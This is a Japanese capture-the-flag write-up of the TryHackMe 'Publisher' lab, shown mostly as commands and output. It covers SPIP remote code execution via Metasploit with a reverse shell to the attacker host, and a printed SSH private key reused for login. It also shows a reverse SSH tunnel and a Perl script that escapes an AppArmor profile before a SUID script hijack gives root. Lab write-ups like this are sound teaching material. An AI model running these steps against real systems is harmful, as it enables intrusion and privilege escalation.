# Publisher CTF

https://tryhackme.com/r/room/publisher

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.217.3
root@ip-10-10-186-123:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-30 04:56 GMT
Nmap scan report for 10.10.217.3
Host is up (0.0060s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:3D:0E:AA:50:C1 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds


root@ip-10-10-186-123:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-30 04:56 GMT
Nmap scan report for 10.10.217.3
Host is up (0.00017s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:3D:0E:AA:50:C1 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
```

SSH と HTTP

### gobuster

```shell
root@ip-10-10-186-123:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.217.3
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.217.3/images/]
/spip                 (Status: 301) [Size: 309] [--> http://10.10.217.3/spip/]
/server-status        (Status: 403) [Size: 276]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-186-123:~# gobuster dir -x=txt,php -u http://$TARGET/spip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.217.3/spip
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/local                (Status: 301) [Size: 315] [--> http://10.10.217.3/spip/local/]
/index.php            (Status: 200) [Size: 8145]
/vendor               (Status: 301) [Size: 316] [--> http://10.10.217.3/spip/vendor/]
/config               (Status: 301) [Size: 316] [--> http://10.10.217.3/spip/config/]
/tmp                  (Status: 301) [Size: 313] [--> http://10.10.217.3/spip/tmp/]
/LICENSE              (Status: 200) [Size: 35147]
/IMG                  (Status: 301) [Size: 313] [--> http://10.10.217.3/spip/IMG/]
/spip.php             (Status: 200) [Size: 8143]
/htaccess.txt         (Status: 200) [Size: 4307]
/ecrire               (Status: 301) [Size: 316] [--> http://10.10.217.3/spip/ecrire/]
/.php                 (Status: 403) [Size: 276]
/prive                (Status: 301) [Size: 315] [--> http://10.10.217.3/spip/prive/]
Progress: 661671 / 661674 (100.00%)
===============================================================
Finished
===============================================================
```

SPIP の脆弱性を検索

```shell
$ searchsploit spip
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
SPIP - 'connect' PHP Injection (Metasploit)                                       | php/remote/27941.rb
SPIP 1.8.2 - 'Spip_RSS.php' Remote Command Execution                              | php/webapps/27172.txt
SPIP 1.8.2g - Remote Command Execution                                            | php/webapps/1482.php
SPIP 1.8.3 - 'Spip_login.php' Remote File Inclusion                               | php/webapps/27589.txt
SPIP 1.8/1.9 - 'index.php3' Cross-Site Scripting                                  | php/webapps/27158.txt
SPIP 1.8/1.9 - Multiple SQL Injections                                            | php/webapps/27157.txt
SPIP 2.1 - 'var_login' Cross-Site Scripting                                       | php/webapps/34388.txt
SPIP 2.x - Multiple Cross-Site Scripting Vulnerabilities                          | php/webapps/37397.html
SPIP 3.1.1/3.1.2 - File Enumeration / Path Traversal                              | php/webapps/40596.txt
SPIP 3.1.2 - Cross-Site Request Forgery                                           | php/webapps/40597.txt
SPIP 3.1.2 Template Compiler/Composer - PHP Code Execution                        | php/webapps/40595.txt
SPIP < 2.0.9 - Arbitrary Copy All Passwords to '.XML' File                        | php/webapps/9448.py
SPIP CMS < 2.0.23/ 2.1.22/3.0.9 - Privilege Escalation                            | php/webapps/33425.py
spip v4.1.10 - Spoofing Admin account                                             | php/webapps/51557.txt
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                             | php/webapps/51536.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## SPIP 脆弱性

```shell
msf6 exploit(unix/webapp/spip_rce_form) > set RHOSTS 10.10.217.3
RHOSTS => 10.10.217.3
msf6 exploit(unix/webapp/spip_rce_form) > set TARGETURI /spip/
TARGETURI => /spip/
msf6 exploit(unix/webapp/spip_rce_form) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(unix/webapp/spip_rce_form) > run

[*] Started reverse TCP handler on 10.2.22.182:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] The target appears to be vulnerable.
[*] Got anti-csrf token: AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[*] 10.10.217.3:80 - Attempting to exploit...
[*] Sending stage (39927 bytes) to 10.10.217.3
[*] Meterpreter session 1 opened (10.2.22.182:4444 -> 10.10.217.3:42766) at 2025-01-30 00:28:26 -0500

meterpreter >
```

meterpreter 取得

```shell
cat /home/think/user.txt
fa22904.....
```

ユーザーフラグゲット

## 権限昇格

```shell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
think:x:1000:1000::/home/think:/bin/sh
```

```shell
cd /home/think
ls -al .ssh
total 20
drwxr-xr-x 2 think think 4096 Jan 10  2024 .
drwxr-xr-x 8 think think 4096 Feb 10  2024 ..
-rw-r--r-- 1 root  root   569 Jan 10  2024 authorized_keys
-rw-r--r-- 1 think think 2602 Jan 10  2024 id_rsa
-rw-r--r-- 1 think think  569 Jan 10  2024 id_rsa.pub
```

think の SSH キーが読める状態。

```shell
cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

kali に保存

```shell
$ nano id_rsa_think
$ chmod 600 ./id_rsa_think
$ ssh think@10.10.217.3 -i id_rsa_think

think@publisher:~$
```

think で SSH 接続できた。

SUID、SGID

```shell
think@publisher:~$ find / -perm -u=s -type f -ls 2>/dev/null
     3279     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
    18535    468 -rwsr-xr-x   1 root     root       477672 Dec 18  2023 /usr/lib/openssh/ssh-keysign
     1383     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
     9110     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     7253     16 -rwsr-sr-x   1 root     root          14488 Dec 13  2023 /usr/lib/xorg/Xorg.wrap
    78918    388 -rwsr-xr--   1 root     dip          395144 Jul 23  2020 /usr/sbin/pppd
   524324     20 -rwsr-sr-x   1 root     root          16760 Nov 14  2023 /usr/sbin/run_container
      491     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at
      672     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
      480     88 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 /usr/bin/gpasswd
      178     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 /usr/bin/chfn
     2463    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
      184     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 /usr/bin/chsh
      547     68 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 /usr/bin/passwd
     9965     56 -rwsr-xr-x   1 root     root          55528 May 30  2023 /usr/bin/mount
    14014     68 -rwsr-xr-x   1 root     root          67816 May 30  2023 /usr/bin/su
     1235     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 /usr/bin/newgrp
     3277     32 -rwsr-xr-x   1 root     root          31032 Feb 21  2022 /usr/bin/pkexec
     9972     40 -rwsr-xr-x   1 root     root          39144 May 30  2023 /usr/bin/umount

think@publisher:~$ find / -perm -g=s -type f -ls 2>/dev/null
    56329     24 -rwxr-sr-x   1 root     mail        22856 Apr  7  2021 /usr/libexec/camel-lock-helper-1.2
   136252     16 -rwxr-sr-x   1 root     utmp        14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
     7253     16 -rwsr-sr-x   1 root     root        14488 Dec 13  2023 /usr/lib/xorg/Xorg.wrap
     1544     44 -rwxr-sr-x   1 root     shadow      43168 Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
     8081     44 -rwxr-sr-x   1 root     shadow      43160 Feb  2  2023 /usr/sbin/unix_chkpwd
   524324     20 -rwsr-sr-x   1 root     root        16760 Nov 14  2023 /usr/sbin/run_container
      491     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
    18529    344 -rwxr-sr-x   1 root     ssh        350504 Dec 18  2023 /usr/bin/ssh-agent
      153     84 -rwxr-sr-x   1 root     shadow      84512 Nov 29  2022 /usr/bin/chage
      504     16 -rwxr-sr-x   1 root     tty         14488 Mar 30  2020 /usr/bin/bsd-write
      185     32 -rwxr-sr-x   1 root     shadow      31312 Nov 29  2022 /usr/bin/expiry
      589     44 -rwxr-sr-x   1 root     crontab     43720 Feb 13  2020 /usr/bin/crontab
    15372     36 -rwxr-sr-x   1 root     tty         35048 May 30  2023 /usr/bin/wall
```

特になし。

```shell
think@publisher:~$ ls -al .gnupg
total 20
drwx------ 3 think think 4096 Feb 10  2024 .
drwxr-xr-x 8 think think 4096 Feb 10  2024 ..
drwx------ 2 think think 4096 Nov 14  2023 private-keys-v1.d
-rw------- 1 think think   32 Nov 14  2023 pubring.kbx
-rw------- 1 think think 1200 Nov 14  2023 trustdb.gpg

think@publisher:~/.gnupg$ ls -al ./private-keys-v1.d/
total 8
drwx------ 2 think think 4096 Nov 14  2023 .
drwx------ 3 think think 4096 Feb 10  2024 ..
```

### LinPeas.sh

LinPeas.sh で probable になっていた候補

```text
[+] [CVE-2022-2586] nft_object UAF
[+] [CVE-2021-4034] PwnKit
[+] [CVE-2021-3156] sudo Baron Samedit
[+] [CVE-2021-3156] sudo Baron Samedit 2
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
```

#### CVE-2021-4034

https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c

```shell
think@publisher:/var/tmp$ ./poc
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
```

効かない。

ターゲット上の 40093 ポートが HTTP 応答を返しているので、SSH トンネリングして gobuster を実行してみる。

```shell
think@publisher:/var/tmp$ nc 127.0.0.1 40093
GET /index.html HTTP/1.1
Host: 127.0.0.1

HTTP/1.1 404 Not Found
Date: Thu, 30 Jan 2025 06:32:42 GMT
Content-Length: 19
Content-Type: text/plain; charset=utf-8

404: Page Not Found


think@publisher:/var/tmp$ ssh tunnel@10.2.22.182 -R 8889:127.0.0.1:40093 -N
```

```shell
$ gobuster dir -x=txt,php -u http://localhost:8889 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
```

特に何も出ない。

```shell
$ dirsearch -u http://localhost:8889/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/CTF/reports/http_localhost_8889/__25-01-30_02-45-12.txt

Target: http://localhost:8889/

[02:45:12] Starting:
[02:45:16] 301 -   46B  - /%2e%2e//google.com  ->  /google.com
[02:45:17] 301 -   46B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[02:46:06] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
[02:46:06] 301 -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
[02:46:06] 301 -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp
[02:46:12] 301 -   46B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[02:46:14] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[02:46:26] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
[02:46:27] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
[02:46:29] 301 -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
[02:46:35] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf

Task Completed
```

SUID が付いていた run_container に注目

```shell
think@publisher:/var/tmp$ strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
```

/opt/run_container.sh を実行していると思われる。

```shell
think@publisher:/var/tmp$ ls -al /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh

think@publisher:/var/tmp$ cat /opt/run_container.sh
#!/bin/bash

# Function to list Docker containers
list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
        docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}

# Function to prompt user for container ID
prompt_container_id() {
    read -p "Enter the ID of the container or leave blank to create a new one: " container_id
    validate_container_id "$container_id"
}

# Function to display options and perform actions
select_action() {
    echo ""
    echo "OPTIONS:"
    local container_id="$1"
    PS3="Choose an action for a container: "
    options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2)  if [ $(docker ps -q | wc -l) -lt 2 ]; then
                    echo "No enough containers are currently running."
                    exit 1
                fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done
}

# Main script execution
list_containers
prompt_container_id  # Get the container ID from prompt_container_id function
select_action "$container_id"  # Pass the container ID to select_action function
```

書き込み権限が付いているが、実際やってみるとパーミッションエラーになる。

docker がフルパスではないところが狙い目と思われる。

```shell
think@publisher:/var/tmp$ echo "bash -p" > docker
think@publisher:/var/tmp$ chmod +x ./docker
think@publisher:/var/tmp$ export PATH=/var/tmp:$PATH
think@publisher:/var/tmp$ /usr/sbin/run_container

# これでうまく行くと思ったが・・・
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 3 hours
```

成功しなかった。

一歩戻って、w 権限が付いているのに、なぜファイルを更新できないのか？

```shell
think@publisher:/var/tmp$ ls -al /etc/apparmor.d/
total 84
drwxr-xr-x   8 root root  4096 Feb 12  2024 .
drwxr-xr-x 130 root root 12288 Feb 12  2024 ..
drwxr-xr-x   2 root root  4096 Dec  8  2023 abi
drwxr-xr-x   4 root root 12288 Dec  8  2023 abstractions
drwxr-xr-x   2 root root  4096 Feb 23  2022 disable
drwxr-xr-x   2 root root  4096 Feb 11  2020 force-complain
drwxr-xr-x   2 root root  4096 Dec  8  2023 local
-rw-r--r--   1 root root  1313 May 19  2020 lsb_release
-rw-r--r--   1 root root  1108 May 19  2020 nvidia_modprobe
-rw-r--r--   1 root root  3500 Jan 31  2023 sbin.dhclient
drwxr-xr-x   5 root root  4096 Dec  8  2023 tunables
-rw-r--r--   1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r--   1 root root   532 Feb 12  2024 usr.sbin.ash
-rw-r--r--   1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r--   1 root root  2006 Jun 14  2023 usr.sbin.mysqld
-rw-r--r--   1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r--   1 root root  1482 Feb 10  2023 usr.sbin.tcpdump

think@publisher:/var/tmp$ echo $0
-ash

think@publisher:/var/tmp$ cat /etc/apparmor.d/usr.sbin.ash
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```

現在のシェルは Bash ではなく Ash シェルであり、AppArmor で Ash シェルの制限ルールが設定されている。

これは、下記の方法で回避可能とのこと。

```shell
echo  '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /var/tmp/test.pl
chmod +x /var/tmp/test.pl
/var/tmp/test.pl
```

制限から解放されたので、シェルスクリプトを変更する。

```shell
# bash -p を先頭に追加する
$ nano /opt/run_container.sh

# SUIDプログラム起動
$ /usr/sbin/run_container
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
3a4225cc.....
```

## 振り返り

- SUID の列挙は「なんとなく何もなさそう」ではいけないことを痛感した。過去の出力と突き合わせて、精査しなければいけない。
- AppArmor は初見。非常に良い勉強になった。
- なぜ PATH 環境変数の変更で成功しなかったのか分からない。

### 検証：なぜ PATH の変更で成功しなかったのか？

大前提として、SUID プログラムで相対パスを突くのは常套手段なので、SUID プログラムだから export した環境変数が引き継がれない、ということではない。

run_container.sh の先頭で、echo $PATH して動作確認。

```shell
think@publisher:/var/tmp$ echo $0
-ash

think@publisher:/var/tmp$ echo $PATH
/var/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

think@publisher:/var/tmp$ export PATH

# PATHの追加が反映されていない
think@publisher:/var/tmp$ /usr/sbin/run_container
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

直接の原因は、PATH 環境変数が孫に引き継がれていないから。

run_container の逆コンパイルしたコードは下記。

```c
undefined8 main(undefined8 param_1,long param_2)

{
  long in_FS_OFFSET;
  char *local_38;
  undefined *local_30;
  char *local_28;
  undefined8 local_20;
  undefined8 local_18;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = "/bin/bash";
  local_30 = &DAT_0010200e;
  local_28 = "/opt/run_container.sh";
  local_20 = *(undefined8 *)(param_2 + 8);
  local_18 = 0;
  execve("/bin/bash",&local_38,(char **)0x0);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

execve の第 3 引数に 0 を渡している。

ドキュメントによると、0 を渡すのは { NULL } のポインタを渡すのと同じ効果になるが、こういう使い方はするなと書かれている。
この辺が原因のような気がするが、明確には理解できない。

```text
On Linux, argv and envp can be specified as NULL.  In both cases,
this has the same effect as specifying the argument as a pointer
to a list containing a single null pointer.  Do not take
advantage of this nonstandard and nonportable misfeature!  On
many other UNIX systems, specifying argv as NULL will result in
an error (EFAULT).  Some other UNIX systems treat the envp==NULL
case the same as Linux.
```

https://man7.org/linux/man-pages/man2/execve.2.html

試しに、root の状態から同じことをしてみる。

```shell
bash-5.0# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
bash-5.0# export PATH=/var/tmp:$PATH
bash-5.0# /sbin/run_container
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

同じように引き継がれない。
